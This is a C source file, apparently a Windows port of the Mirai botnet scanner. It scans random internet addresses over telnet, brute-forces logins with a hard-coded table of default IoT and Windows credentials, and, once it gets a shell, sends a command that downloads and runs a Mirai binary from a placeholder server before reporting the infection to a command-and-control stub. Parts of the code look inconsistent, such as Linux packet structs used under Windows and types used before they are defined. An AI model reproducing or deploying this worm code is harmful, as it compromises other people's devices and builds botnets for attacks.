// Windows Scanner Module - Network scanning with Windows APIs
// Converts Linux telnet/SSH scanning to Windows-compatible implementation

#ifdef _WIN32
#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

// Windows socket compatibility
#define close(s) closesocket(s)
typedef int socklen_t;
#define MSG_NOSIGNAL 0
#define O_NONBLOCK 0

#else
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

#include "includes.h"
#include "scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"

// Scanner state
static int scanner_pid = 0;
static uint32_t fake_time = 0;
static struct scanner_connection *conn_table;
static uint16_t scanner_rawpkt_size = 0;
static char *scanner_rawpkt = NULL;

// Windows-specific scanner state
#ifdef _WIN32
static HANDLE hScannerThread = NULL;
static CRITICAL_SECTION scanner_lock;
static BOOL scanner_running = FALSE;

// Windows raw socket support (requires admin privileges)
static SOCKET raw_sock = INVALID_SOCKET;
static BOOL use_raw_sockets = FALSE;

// Windows threading for scanner
static DWORD WINAPI scanner_thread_windows(LPVOID lpParam);
static void init_windows_scanner(void);
static void cleanup_windows_scanner(void);

// Network interface enumeration
static void get_windows_interfaces(void);
static uint32_t get_local_ip_windows(void);

#endif

// Scanner connection structure
struct scanner_connection
{
  struct sockaddr_in dest_addr;
  int fd;
  enum scanner_connection_state state;
  int last_recv, last_send;
  int auth_try_index;
  char rdbuf[256];
  int rdbuf_pos;
  char *payload_buf;
  int payload_buf_len;
#ifdef _WIN32
  OVERLAPPED overlapped;
  BOOL async_pending;
#endif
};

// Connection states
enum scanner_connection_state
{
  SC_CLOSED,
  SC_CONNECTING,
  SC_HANDLE_IACS,
  SC_WAITING_USERNAME,
  SC_WAITING_PASSWORD,
  SC_WAITING_PROMPT,
  SC_EXPLOIT_STAGE2,
  SC_VERIFY_CREDS,
  SC_UPLOAD_METHODS,
};

// Authentication database (Windows-optimized)
static struct auth_entry
{
  char username[32];
  char password[32];
  uint16_t weight;
} auth_table[] = {
    // Common Windows credentials
    {"Administrator", "admin", 10},
    {"Administrator", "password", 9},
    {"Administrator", "123456", 8},
    {"admin", "admin", 9},
    {"admin", "password", 8},
    {"admin", "", 7},
    {"user", "user", 6},
    {"guest", "guest", 5},
    {"test", "test", 5},

    // IoT device credentials (original Mirai targets)
    {"root", "xc3511", 10},
    {"root", "vizxv", 9},
    {"root", "admin", 8},
    {"admin", "admin", 7},
    {"root", "888888", 6},
    {"root", "xmhdipc", 6},
    {"root", "default", 6},
    {"root", "juantech", 6},
    {"root", "123456", 6},
    {"root", "54321", 6},
    {"support", "support", 5},
    {"root", "", 4},
    {"admin", "password", 4},
    {"root", "root", 4},
    {"user", "user", 3},
    {"admin", "", 3},
    {"root", "pass", 3},
    {"admin", "admin1234", 3},
    {"root", "1111", 3},
    {"admin", "smcadmin", 3},
    {"admin", "1111", 3},
    {"root", "666666", 3},
    {"root", "password", 3},
    {"root", "1234", 3},
    {"root", "klv123", 3},
    {"Administrator", "123456", 3},
    {"service", "service", 3},
    {"supervisor", "supervisor", 3},
    {"guest", "", 2},
    {"guest", "guest", 2},
    {"admin1", "password", 2},
    {"administrator", "1234", 2},
    {"666666", "666666", 2},
    {"888888", "888888", 2},
    {"ubnt", "ubnt", 2},
    {"root", "klv1234", 2},
    {"root", "Zte521", 2},
    {"root", "hi3518", 2},
    {"root", "jvbzd", 2},
    {"root", "anko", 2},
    {"root", "zlxx.", 2},
    {"root", "7ujMko0vizxv", 2},
    {"root", "7ujMko0admin", 2},
    {"root", "system", 2},
    {"root", "ikwb", 2},
    {"root", "dreambox", 2},
    {"root", "user", 2},
    {"root", "realtek", 2},
    {"root", "00000000", 2},
    {"admin", "1111111", 2},
    {"admin", "1234", 2},
    {"admin", "12345", 2},
    {"admin", "54321", 2},
    {"admin", "123456", 2},
    {"admin", "7ujMko0admin", 2},
    {"admin", "1234567890", 2},
    {"admin", "pass", 2},
    {"admin", "meinsm", 2},
    {"tech", "tech", 1},
    {"mother", "fucker", 1},
};

// Initialize scanner module
void scanner_init(void)
{
  int i;
  uint16_t source_port;
  struct iphdr *iph;
  struct tcphdr *tcph;

#ifdef _WIN32
  init_windows_scanner();
#endif

  scanner_pid = getpid();
  fake_time = time(NULL);

  conn_table = calloc(SCANNER_MAX_CONNS, sizeof(struct scanner_connection));
  if (conn_table == NULL)
  {
    return;
  }

  // Initialize connection table
  for (i = 0; i < SCANNER_MAX_CONNS; i++)
  {
    conn_table[i].fd = -1;
    conn_table[i].state = SC_CLOSED;
#ifdef _WIN32
    memset(&conn_table[i].overlapped, 0, sizeof(OVERLAPPED));
    conn_table[i].async_pending = FALSE;
#endif
  }

  // Create raw packet for SYN scanning
  scanner_rawpkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + 4;
  scanner_rawpkt = malloc(scanner_rawpkt_size);
  if (scanner_rawpkt == NULL)
  {
    return;
  }

  // Initialize IP header
  iph = (struct iphdr *)scanner_rawpkt;
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = htons(scanner_rawpkt_size);
  iph->id = rand_next();
  iph->frag_off = htons(1 << 14); // Don't fragment
  iph->ttl = 64;
  iph->protocol = IPPROTO_TCP;
  iph->check = 0;
  iph->saddr = 0; // Will be filled later
  iph->daddr = 0; // Will be filled later

  // Initialize TCP header
  tcph = (struct tcphdr *)(scanner_rawpkt + sizeof(struct iphdr));
  tcph->source = 0; // Will be filled later
  tcph->dest = 0;   // Will be filled later
  tcph->seq = rand_next();
  tcph->ack_seq = 0;
  tcph->doff = 6; // TCP header size
  tcph->fin = tcph->syn = tcph->rst = tcph->psh = tcph->ack = tcph->urg = 0;
  tcph->window = rand_next() & 0xffff;
  tcph->check = 0;
  tcph->urg_ptr = 0;

  // TCP options (MSS)
  *((uint32_t *)(scanner_rawpkt + sizeof(struct iphdr) + sizeof(struct tcphdr))) = htonl(0x020405b4);

  tcph->syn = 1;

#ifdef _WIN32
  // Start Windows scanner thread
  if (scanner_running)
  {
    hScannerThread = CreateThread(NULL, 0, scanner_thread_windows, NULL, 0, NULL);
    if (hScannerThread == NULL)
    {
#ifdef DEBUG
      printf("[scanner_windows] Failed to create scanner thread\n");
#endif
    }
  }
#endif

#ifdef DEBUG
  printf("[scanner] Initialized with PID %d\n", scanner_pid);
#endif
}

#ifdef _WIN32
// Windows-specific scanner initialization
static void init_windows_scanner(void)
{
  // Initialize critical section for thread safety
  InitializeCriticalSection(&scanner_lock);
  scanner_running = TRUE;

  // Try to create raw socket (requires admin privileges)
  raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (raw_sock != INVALID_SOCKET)
  {
    use_raw_sockets = TRUE;

    // Set socket options for raw socket
    BOOL flag = TRUE;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == SOCKET_ERROR)
    {
      closesocket(raw_sock);
      raw_sock = INVALID_SOCKET;
      use_raw_sockets = FALSE;
    }
  }

  if (!use_raw_sockets)
  {
#ifdef DEBUG
    printf("[scanner_windows] Raw sockets not available, using TCP connect scanning\n");
#endif
  }
}

// Windows scanner thread
static DWORD WINAPI scanner_thread_windows(LPVOID lpParam)
{
  while (scanner_running)
  {
    scanner_scan_random();
    Sleep(SCANNER_SCAN_INTERVAL);
  }
  return 0;
}

// Cleanup Windows scanner
static void cleanup_windows_scanner(void)
{
  scanner_running = FALSE;

  if (hScannerThread != NULL)
  {
    WaitForSingleObject(hScannerThread, 5000);
    CloseHandle(hScannerThread);
    hScannerThread = NULL;
  }

  if (raw_sock != INVALID_SOCKET)
  {
    closesocket(raw_sock);
    raw_sock = INVALID_SOCKET;
  }

  DeleteCriticalSection(&scanner_lock);
}

// Get Windows network interfaces
static void get_windows_interfaces(void)
{
  PIP_ADAPTER_INFO pAdapterInfo;
  PIP_ADAPTER_INFO pAdapter = NULL;
  ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
  DWORD dwRetVal = 0;

  pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
  if (pAdapterInfo == NULL)
  {
    return;
  }

  if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
  {
    free(pAdapterInfo);
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
    if (pAdapterInfo == NULL)
    {
      return;
    }
  }

  if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR)
  {
    pAdapter = pAdapterInfo;
    while (pAdapter)
    {
      if (pAdapter->Type == MIB_IF_TYPE_ETHERNET || pAdapter->Type == IF_TYPE_IEEE80211)
      {
        // Process network interface
#ifdef DEBUG
        printf("[scanner_windows] Found interface: %s (%s)\n",
               pAdapter->AdapterName, pAdapter->IpAddressList.IpAddress.String);
#endif
      }
      pAdapter = pAdapter->Next;
    }
  }

  if (pAdapterInfo)
  {
    free(pAdapterInfo);
  }
}

// Get local IP for Windows
static uint32_t get_local_ip_windows(void)
{
  // Implementation similar to get_windows_interfaces but returns IP
  char hostname[256];
  struct hostent *host_entry;

  if (gethostname(hostname, sizeof(hostname)) == 0)
  {
    host_entry = gethostbyname(hostname);
    if (host_entry != NULL && host_entry->h_addr_list[0] != NULL)
    {
      return *((uint32_t *)host_entry->h_addr_list[0]);
    }
  }

  return inet_addr("127.0.0.1"); // Fallback to localhost
}

#endif

// Main scanning function
void scanner_scan_random(void)
{
  int i;
  uint32_t netmask = 0;
  uint32_t addr = 0;

  // Generate random target network
  switch (rand_next() % 3)
  {
  case 0: // Class A networks
    addr = (rand_next() & 0xFF) << 24;
    netmask = 0xFF000000;
    break;
  case 1: // Class B networks
    addr = (rand_next() & 0xFFFF) << 16;
    netmask = 0xFFFF0000;
    break;
  case 2: // Class C networks
    addr = (rand_next() & 0xFFFFFF) << 8;
    netmask = 0xFFFFFF00;
    break;
  }

  // Skip private/reserved networks
  if ((addr & 0xFF000000) == 0x0A000000 || // 10.0.0.0/8
      (addr & 0xFFF00000) == 0xAC100000 || // 172.16.0.0/12
      (addr & 0xFFFF0000) == 0xC0A80000 || // 192.168.0.0/16
      (addr & 0xFF000000) == 0x7F000000 || // 127.0.0.0/8 (loopback)
      (addr & 0xF0000000) == 0xE0000000 || // Multicast
      (addr & 0xF0000000) == 0xF0000000)
  {         // Reserved
    return; // Skip this network
  }

  // Scan multiple IPs in this network
  for (i = 0; i < SCANNER_RATELIMIT_PER_NETWORK; i++)
  {
    uint32_t target_ip = addr | (rand_next() & ~netmask);
    scanner_scan_target(target_ip);
  }
}

// Scan specific target
void scanner_scan_target(uint32_t ip)
{
  struct scanner_connection *conn;
  int fd;
  struct sockaddr_in bind_addr, dest_addr;

  // Find free connection slot
  conn = get_free_conn();
  if (conn == NULL)
  {
    return; // No free connections
  }

#ifdef _WIN32
  // Windows-specific socket creation
  fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (fd == INVALID_SOCKET)
  {
    return;
  }

  // Set non-blocking mode
  unsigned long mode = 1;
  if (ioctlsocket(fd, FIONBIO, &mode) == SOCKET_ERROR)
  {
    closesocket(fd);
    return;
  }

#else
  // Linux socket creation
  fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd == -1)
  {
    return;
  }

  // Set non-blocking
  int flags = fcntl(fd, F_GETFL, 0);
  fcntl(fd, F_SETFL, flags | O_NONBLOCK);
#endif

  // Bind to random local port
  memset(&bind_addr, 0, sizeof(bind_addr));
  bind_addr.sin_family = AF_INET;
  bind_addr.sin_addr.s_addr = INADDR_ANY;
  bind_addr.sin_port = 0; // Let system choose

  if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) == -1)
  {
    close(fd);
    return;
  }

  // Set up destination
  memset(&dest_addr, 0, sizeof(dest_addr));
  dest_addr.sin_family = AF_INET;
  dest_addr.sin_addr.s_addr = ip;
  dest_addr.sin_port = htons(23); // Telnet port

  // Initialize connection structure
  conn->fd = fd;
  conn->state = SC_CONNECTING;
  conn->dest_addr = dest_addr;
  conn->last_send = conn->last_recv = fake_time;
  conn->auth_try_index = 0;
  conn->rdbuf_pos = 0;

  // Attempt connection
  int result = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

#ifdef _WIN32
  if (result == SOCKET_ERROR && WSAGetLastError() != WSAEWOULDBLOCK)
  {
#else
  if (result == -1 && errno != EINPROGRESS)
  {
#endif
    close(fd);
    conn->state = SC_CLOSED;
    conn->fd = -1;
    return;
  }

#ifdef DEBUG
  printf("[scanner] Connecting to %s:23\n", inet_ntoa(dest_addr.sin_addr));
#endif
}

// Get free connection slot
static struct scanner_connection *get_free_conn(void)
{
  int i;

#ifdef _WIN32
  EnterCriticalSection(&scanner_lock);
#endif

  for (i = 0; i < SCANNER_MAX_CONNS; i++)
  {
    if (conn_table[i].state == SC_CLOSED)
    {
#ifdef _WIN32
      LeaveCriticalSection(&scanner_lock);
#endif
      return &conn_table[i];
    }
  }

#ifdef _WIN32
  LeaveCriticalSection(&scanner_lock);
#endif
  return NULL;
}

// Process scanner connections
void scanner_process_connections(void)
{
  int i;
  fd_set fdset_rd, fdset_wr, fdset_ex;
  struct timeval timeo = {0, 0};
  int max_fd = 0;

  FD_ZERO(&fdset_rd);
  FD_ZERO(&fdset_wr);
  FD_ZERO(&fdset_ex);

  // Build fd sets
  for (i = 0; i < SCANNER_MAX_CONNS; i++)
  {
    if (conn_table[i].state == SC_CLOSED || conn_table[i].fd == -1)
    {
      continue;
    }

    int fd = conn_table[i].fd;

    if (conn_table[i].state == SC_CONNECTING)
    {
      FD_SET(fd, &fdset_wr);
      FD_SET(fd, &fdset_ex);
    }
    else
    {
      FD_SET(fd, &fdset_rd);
    }

    if (fd > max_fd)
      max_fd = fd;
  }

  if (max_fd == 0)
    return;

  // Select with immediate timeout (non-blocking)
  int nfds = select(max_fd + 1, &fdset_rd, &fdset_wr, &fdset_ex, &timeo);
  if (nfds <= 0)
    return;

  // Process ready connections
  for (i = 0; i < SCANNER_MAX_CONNS; i++)
  {
    if (conn_table[i].state == SC_CLOSED || conn_table[i].fd == -1)
    {
      continue;
    }

    int fd = conn_table[i].fd;

    if (FD_ISSET(fd, &fdset_ex))
    {
      // Connection error
      close_conn(&conn_table[i]);
      continue;
    }

    if (FD_ISSET(fd, &fdset_wr))
    {
      // Connection established
      handle_connection_established(&conn_table[i]);
    }

    if (FD_ISSET(fd, &fdset_rd))
    {
      // Data available to read
      handle_connection_data(&conn_table[i]);
    }

    // Check for timeouts
    if (fake_time - conn_table[i].last_recv > SCANNER_CONN_TIMEOUT)
    {
      close_conn(&conn_table[i]);
    }
  }
}

// Handle established connection
static void handle_connection_established(struct scanner_connection *conn)
{
  // Connection successful, wait for telnet negotiation
  conn->state = SC_HANDLE_IACS;
  conn->last_recv = fake_time;

#ifdef DEBUG
  printf("[scanner] Connected to %s\n", inet_ntoa(conn->dest_addr.sin_addr));
#endif
}

// Handle incoming data
static void handle_connection_data(struct scanner_connection *conn)
{
  int ret;
  char buf[256];

  ret = recv(conn->fd, buf, sizeof(buf) - 1, MSG_NOSIGNAL);
  if (ret <= 0)
  {
    close_conn(conn);
    return;
  }

  buf[ret] = '\0';
  conn->last_recv = fake_time;

  // Append to read buffer
  if (conn->rdbuf_pos + ret < sizeof(conn->rdbuf) - 1)
  {
    memcpy(conn->rdbuf + conn->rdbuf_pos, buf, ret);
    conn->rdbuf_pos += ret;
    conn->rdbuf[conn->rdbuf_pos] = '\0';
  }

  // Process based on current state
  switch (conn->state)
  {
  case SC_HANDLE_IACS:
    if (strstr(conn->rdbuf, "login:") || strstr(conn->rdbuf, "Username:"))
    {
      conn->state = SC_WAITING_USERNAME;
      send_username(conn);
    }
    break;

  case SC_WAITING_PASSWORD:
    if (strstr(conn->rdbuf, "Password:") || strstr(conn->rdbuf, "password:"))
    {
      send_password(conn);
      conn->state = SC_WAITING_PROMPT;
    }
    break;

  case SC_WAITING_PROMPT:
    if (strstr(conn->rdbuf, "$") || strstr(conn->rdbuf, "#") || strstr(conn->rdbuf, ">"))
    {
      // We have a shell! Device compromised
      exploit_device(conn);
    }
    else if (strstr(conn->rdbuf, "incorrect") || strstr(conn->rdbuf, "failed"))
    {
      // Login failed, try next credentials
      try_next_auth(conn);
    }
    break;
  }
}

// Send username
static void send_username(struct scanner_connection *conn)
{
  char *username = auth_table[conn->auth_try_index].username;
  send(conn->fd, username, strlen(username), MSG_NOSIGNAL);
  send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
  conn->state = SC_WAITING_PASSWORD;
  conn->rdbuf_pos = 0; // Clear buffer

#ifdef DEBUG
  printf("[scanner] Sent username: %s\n", username);
#endif
}

// Send password
static void send_password(struct scanner_connection *conn)
{
  char *password = auth_table[conn->auth_try_index].password;
  send(conn->fd, password, strlen(password), MSG_NOSIGNAL);
  send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
  conn->rdbuf_pos = 0; // Clear buffer

#ifdef DEBUG
  printf("[scanner] Sent password: %s\n", password);
#endif
}

// Try next authentication
static void try_next_auth(struct scanner_connection *conn)
{
  conn->auth_try_index++;

  if (conn->auth_try_index >= sizeof(auth_table) / sizeof(auth_table[0]))
  {
    // No more credentials to try
    close_conn(conn);
    return;
  }

  // Reset state to try next credentials
  conn->state = SC_WAITING_USERNAME;
  conn->rdbuf_pos = 0;
  send_username(conn);
}

// Exploit compromised device
static void exploit_device(struct scanner_connection *conn)
{
  char *payload = "cd /tmp; wget http://your.server.com/mirai.mips; chmod +x mirai.mips; ./mirai.mips\r\n";

  send(conn->fd, payload, strlen(payload), MSG_NOSIGNAL);

#ifdef DEBUG
  printf("[scanner] Device compromised: %s\n", inet_ntoa(conn->dest_addr.sin_addr));
#endif

  // Report success to C&C server
  report_infection(conn->dest_addr.sin_addr.s_addr);

  // Close connection
  close_conn(conn);
}

// Report successful infection to C&C
static void report_infection(uint32_t ip)
{
  // Implementation would send notification to C&C server
  // about successful device compromise

#ifdef DEBUG
  struct in_addr addr;
  addr.s_addr = ip;
  printf("[scanner] Reported infection: %s\n", inet_ntoa(addr));
#endif
}

// Close connection
static void close_conn(struct scanner_connection *conn)
{
  if (conn->fd != -1)
  {
    close(conn->fd);
    conn->fd = -1;
  }

  conn->state = SC_CLOSED;
  conn->rdbuf_pos = 0;

  if (conn->payload_buf != NULL)
  {
    free(conn->payload_buf);
    conn->payload_buf = NULL;
    conn->payload_buf_len = 0;
  }

#ifdef _WIN32
  if (conn->async_pending)
  {
    CancelIo((HANDLE)conn->fd);
    conn->async_pending = FALSE;
  }
#endif
}

// Cleanup scanner
void scanner_kill(void)
{
  int i;

#ifdef _WIN32
  cleanup_windows_scanner();
#endif

  // Close all connections
  if (conn_table != NULL)
  {
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
      close_conn(&conn_table[i]);
    }
    free(conn_table);
    conn_table = NULL;
  }

  // Free raw packet buffer
  if (scanner_rawpkt != NULL)
  {
    free(scanner_rawpkt);
    scanner_rawpkt = NULL;
  }
}

// Update fake time (called periodically)
void scanner_update_time(void)
{
  fake_time++;
}